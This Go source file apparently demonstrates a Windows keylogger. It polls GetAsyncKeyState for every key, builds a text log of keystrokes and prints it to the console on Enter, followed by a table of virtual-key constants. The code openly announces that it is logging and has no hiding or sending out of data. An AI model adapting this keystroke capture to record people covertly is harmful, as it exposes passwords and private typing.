package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

	tmpKeylog string
	tmpTitle  string
)

func keyLogger() {
	for {
		time.Sleep(100 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val&0x0001 != 0 {
				fmt.Println(int(Val))
				switch KEY {
				case VK_CONTROL:
					tmpKeylog += "[Ctrl]"
				case VK_BACK:
					tmpKeylog += "[Back]"
				case VK_TAB:
					tmpKeylog += "[Tab]"
				case VK_RETURN:
					tmpKeylog += "[Enter]\r\n"
				case VK_SHIFT:
					tmpKeylog += "[Shift]"
				case VK_MENU:
					tmpKeylog += "[Alt]"
				case VK_CAPITAL:
					tmpKeylog += "[CapsLock]"
				case VK_ESCAPE:
					tmpKeylog += "[Esc]"
				case VK_SPACE:
					tmpKeylog += " "
				case VK_PRIOR:
					tmpKeylog += "[PageUp]"
				case VK_NEXT:
					tmpKeylog += "[PageDown]"
				case VK_END:
					tmpKeylog += "[End]"
				case VK_HOME:
					tmpKeylog += "[Home]"
				case VK_LEFT:
					tmpKeylog += "[Left]"
				case VK_UP:
					tmpKeylog += "[Up]"
				case VK_RIGHT:
					tmpKeylog += "[Right]"
				case VK_DOWN:
					tmpKeylog += "[Down]"
				case VK_SELECT:
					tmpKeylog += "[Select]"
				case VK_PRINT:
					tmpKeylog += "[Print]"
				case VK_EXECUTE:
					tmpKeylog += "[Execute]"
				case VK_SNAPSHOT:
					tmpKeylog += "[PrintScreen]"
				case VK_INSERT:
					tmpKeylog += "[Insert]"
				case VK_DELETE:
					tmpKeylog += "[Delete]"
				case VK_HELP:
					tmpKeylog += "[Help]"
				case VK_LWIN:
					tmpKeylog += "[LeftWindows]"
				case VK_RWIN:
					tmpKeylog += "[RightWindows]"
				case VK_APPS:
					tmpKeylog += "[Applications]"
				case VK_SLEEP:
					tmpKeylog += "[Sleep]"
				case VK_NUMPAD0:
					tmpKeylog += "[Pad 0]"
				case VK_NUMPAD1:
					tmpKeylog += "[Pad 1]"
				case VK_NUMPAD2:
					tmpKeylog += "[Pad 2]"
				case VK_NUMPAD3:
					tmpKeylog += "[Pad 3]"
				case VK_NUMPAD4:
					tmpKeylog += "[Pad 4]"
				case VK_NUMPAD5:
					tmpKeylog += "[Pad 5]"
				case VK_NUMPAD6:
					tmpKeylog += "[Pad 6]"
				case VK_NUMPAD7:
					tmpKeylog += "[Pad 7]"
				case VK_NUMPAD8:
					tmpKeylog += "[Pad 8]"
				case VK_NUMPAD9:
					tmpKeylog += "[Pad 9]"
				case VK_MULTIPLY:
					tmpKeylog += "*"
				case VK_ADD:
					tmpKeylog += "+"
				case VK_SEPARATOR:
					tmpKeylog += "[Separator]"
				case VK_SUBTRACT:
					tmpKeylog += "-"
				case VK_DECIMAL:
					tmpKeylog += "."
				case VK_DIVIDE:
					tmpKeylog += "[Devide]"
				case VK_F1:
					tmpKeylog += "[F1]"
				case VK_F2:
					tmpKeylog += "[F2]"
				case VK_F3:
					tmpKeylog += "[F3]"
				case VK_F4:
					tmpKeylog += "[F4]"
				case VK_F5:
					tmpKeylog += "[F5]"
				case VK_F6:
					tmpKeylog += "[F6]"
				case VK_F7:
					tmpKeylog += "[F7]"
				case VK_F8:
					tmpKeylog += "[F8]"
				case VK_F9:
					tmpKeylog += "[F9]"
				case VK_F10:
					tmpKeylog += "[F10]"
				case VK_F11:
					tmpKeylog += "[F11]"
				case VK_F12:
					tmpKeylog += "[F12]"
				case VK_NUMLOCK:
					tmpKeylog += "[NumLock]"
				case VK_SCROLL:
					tmpKeylog += "[ScrollLock]"
				case VK_LSHIFT:
					tmpKeylog += "[LeftShift]"
				case VK_RSHIFT:
					tmpKeylog += "[RightShift]"
				case VK_LCONTROL:
					tmpKeylog += "[LeftCtrl]"
				case VK_RCONTROL:
					tmpKeylog += "[RightCtrl]"
				case VK_LMENU:
					tmpKeylog += "[LeftMenu]"
				case VK_RMENU:
					tmpKeylog += "[RightMenu]"
				case VK_OEM_1:
					tmpKeylog += ";"
				case VK_OEM_2:
					tmpKeylog += "/"
				case VK_OEM_3:
					tmpKeylog += "`"
				case VK_OEM_4:
					tmpKeylog += "["
				case VK_OEM_5:
					tmpKeylog += "\\"
				case VK_OEM_6:
					tmpKeylog += "]"
				case VK_OEM_7:
					tmpKeylog += "'"
				case VK_OEM_PERIOD:
					tmpKeylog += "."
				case 0x30:
					tmpKeylog += "0"
				case 0x31:
					tmpKeylog += "1"
				case 0x32:
					tmpKeylog += "2"
				case 0x33:
					tmpKeylog += "3"
				case 0x34:
					tmpKeylog += "4"
				case 0x35:
					tmpKeylog += "5"
				case 0x36:
					tmpKeylog += "6"
				case 0x37:
					tmpKeylog += "7"
				case 0x38:
					tmpKeylog += "8"
				case 0x39:
					tmpKeylog += "9"
				case 0x41:
					fmt.Println("a")
					tmpKeylog += "a"
				case 0x42:
					tmpKeylog += "b"
				case 0x43:
					tmpKeylog += "c"
				case 0x44:
					tmpKeylog += "d"
				case 0x45:
					tmpKeylog += "e"
				case 0x46:
					tmpKeylog += "f"
				case 0x47:
					tmpKeylog += "g"
				case 0x48:
					tmpKeylog += "h"
				case 0x49:
					tmpKeylog += "i"
				case 0x4A:
					tmpKeylog += "j"
				case 0x4B:
					tmpKeylog += "k"
				case 0x4C:
					tmpKeylog += "l"
				case 0x4D:
					tmpKeylog += "m"
				case 0x4E:
					tmpKeylog += "n"
				case 0x4F:
					tmpKeylog += "o"
				case 0x50:
					tmpKeylog += "p"
				case 0x51:
					tmpKeylog += "q"
				case 0x52:
					tmpKeylog += "r"
				case 0x53:
					tmpKeylog += "s"
				case 0x54:
					tmpKeylog += "t"
				case 0x55:
					tmpKeylog += "u"
				case 0x56:
					tmpKeylog += "v"
				case 0x57:
					tmpKeylog += "w"
				case 0x58:
					tmpKeylog += "x"
				case 0x59:
					tmpKeylog += "y"
				case 0x5A:
					tmpKeylog += "z"
				}
			}
		}
	}
}

func main() {
	fmt.Println("Start Logging")
	go keyLogger()
	fmt.Println("Press Enter on me to see logs.")
	os.Stdin.Read([]byte{0})
	fmt.Println(tmpKeylog)
	fmt.Println("Press Enter to Exit.")
	os.Stdin.Read([]byte{0})
}

// Virtual-Key Codes
const (
	VK_LBUTTON             = 0x01
	VK_RBUTTON             = 0x02
	VK_CANCEL              = 0x03
	VK_MBUTTON             = 0x04
	VK_XBUTTON1            = 0x05
	VK_XBUTTON2            = 0x06
	VK_BACK                = 0x08
	VK_TAB                 = 0x09
	VK_CLEAR               = 0x0C
	VK_RETURN              = 0x0D
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_PAUSE               = 0x13
	VK_CAPITAL             = 0x14
	VK_KANA                = 0x15
	VK_HANGEUL             = 0x15
	VK_HANGUL              = 0x15
	VK_JUNJA               = 0x17
	VK_FINAL               = 0x18
	VK_HANJA               = 0x19
	VK_KANJI               = 0x19
	VK_ESCAPE              = 0x1B
	VK_CONVERT             = 0x1C
	VK_NONCONVERT          = 0x1D
	VK_ACCEPT              = 0x1E
	VK_MODECHANGE          = 0x1F
	VK_SPACE               = 0x20
	VK_PRIOR               = 0x21
	VK_NEXT                = 0x22
	VK_END                 = 0x23
	VK_HOME                = 0x24
	VK_LEFT                = 0x25
	VK_UP                  = 0x26
	VK_RIGHT               = 0x27
	VK_DOWN                = 0x28
	VK_SELECT              = 0x29
	VK_PRINT               = 0x2A
	VK_EXECUTE             = 0x2B
	VK_SNAPSHOT            = 0x2C
	VK_INSERT              = 0x2D
	VK_DELETE              = 0x2E
	VK_HELP                = 0x2F
	VK_LWIN                = 0x5B
	VK_RWIN                = 0x5C
	VK_APPS                = 0x5D
	VK_SLEEP               = 0x5F
	VK_NUMPAD0             = 0x60
	VK_NUMPAD1             = 0x61
	VK_NUMPAD2             = 0x62
	VK_NUMPAD3             = 0x63
	VK_NUMPAD4             = 0x64
	VK_NUMPAD5             = 0x65
	VK_NUMPAD6             = 0x66
	VK_NUMPAD7             = 0x67
	VK_NUMPAD8             = 0x68
	VK_NUMPAD9             = 0x69
	VK_MULTIPLY            = 0x6A
	VK_ADD                 = 0x6B
	VK_SEPARATOR           = 0x6C
	VK_SUBTRACT            = 0x6D
	VK_DECIMAL             = 0x6E
	VK_DIVIDE              = 0x6F
	VK_F1                  = 0x70
	VK_F2                  = 0x71
	VK_F3                  = 0x72
	VK_F4                  = 0x73
	VK_F5                  = 0x74
	VK_F6                  = 0x75
	VK_F7                  = 0x76
	VK_F8                  = 0x77
	VK_F9                  = 0x78
	VK_F10                 = 0x79
	VK_F11                 = 0x7A
	VK_F12                 = 0x7B
	VK_F13                 = 0x7C
	VK_F14                 = 0x7D
	VK_F15                 = 0x7E
	VK_F16                 = 0x7F
	VK_F17                 = 0x80
	VK_F18                 = 0x81
	VK_F19                 = 0x82
	VK_F20                 = 0x83
	VK_F21                 = 0x84
	VK_F22                 = 0x85
	VK_F23                 = 0x86
	VK_F24                 = 0x87
	VK_NUMLOCK             = 0x90
	VK_SCROLL              = 0x91
	VK_OEM_NEC_EQUAL       = 0x92
	VK_OEM_FJ_JISHO        = 0x92
	VK_OEM_FJ_MASSHOU      = 0x93
	VK_OEM_FJ_TOUROKU      = 0x94
	VK_OEM_FJ_LOYA         = 0x95
	VK_OEM_FJ_ROYA         = 0x96
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	VK_BROWSER_BACK        = 0xA6
	VK_BROWSER_FORWARD     = 0xA7
	VK_BROWSER_REFRESH     = 0xA8
	VK_BROWSER_STOP        = 0xA9
	VK_BROWSER_SEARCH      = 0xAA
	VK_BROWSER_FAVORITES   = 0xAB
	VK_BROWSER_HOME        = 0xAC
	VK_VOLUME_MUTE         = 0xAD
	VK_VOLUME_DOWN         = 0xAE
	VK_VOLUME_UP           = 0xAF
	VK_MEDIA_NEXT_TRACK    = 0xB0
	VK_MEDIA_PREV_TRACK    = 0xB1
	VK_MEDIA_STOP          = 0xB2
	VK_MEDIA_PLAY_PAUSE    = 0xB3
	VK_LAUNCH_MAIL         = 0xB4
	VK_LAUNCH_MEDIA_SELECT = 0xB5
	VK_LAUNCH_APP1         = 0xB6
	VK_LAUNCH_APP2         = 0xB7
	VK_OEM_1               = 0xBA
	VK_OEM_PLUS            = 0xBB
	VK_OEM_COMMA           = 0xBC
	VK_OEM_MINUS           = 0xBD
	VK_OEM_PERIOD          = 0xBE
	VK_OEM_2               = 0xBF
	VK_OEM_3               = 0xC0
	VK_OEM_4               = 0xDB
	VK_OEM_5               = 0xDC
	VK_OEM_6               = 0xDD
	VK_OEM_7               = 0xDE
	VK_OEM_8               = 0xDF
	VK_OEM_AX              = 0xE1
	VK_OEM_102             = 0xE2
	VK_ICO_HELP            = 0xE3
	VK_ICO_00              = 0xE4
	VK_PROCESSKEY          = 0xE5
	VK_ICO_CLEAR           = 0xE6
	VK_PACKET              = 0xE7
	VK_OEM_RESET           = 0xE9
	VK_OEM_JUMP            = 0xEA
	VK_OEM_PA1             = 0xEB
	VK_OEM_PA2             = 0xEC
	VK_OEM_PA3             = 0xED
	VK_OEM_WSCTRL          = 0xEE
	VK_OEM_CUSEL           = 0xEF
	VK_OEM_ATTN            = 0xF0
	VK_OEM_FINISH          = 0xF1
	VK_OEM_COPY            = 0xF2
	VK_OEM_AUTO            = 0xF3
	VK_OEM_ENLW            = 0xF4
	VK_OEM_BACKTAB         = 0xF5
	VK_ATTN                = 0xF6
	VK_CRSEL               = 0xF7
	VK_EXSEL               = 0xF8
	VK_EREOF               = 0xF9
	VK_PLAY                = 0xFA
	VK_ZOOM                = 0xFB
	VK_NONAME              = 0xFC
	VK_PA1                 = 0xFD
	VK_OEM_CLEAR           = 0xFE
)
